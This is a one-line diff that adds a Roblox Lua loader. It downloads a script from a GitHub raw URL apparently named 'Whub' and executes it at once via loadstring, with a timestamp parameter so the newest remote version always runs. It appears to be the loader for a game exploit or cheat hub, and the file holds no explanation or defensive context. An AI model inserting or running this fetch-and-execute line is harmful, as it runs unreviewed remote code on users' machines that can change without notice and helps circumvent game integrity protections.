@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dertonware/Whub/refs/heads/main/Whub?v=" .. tick()))()
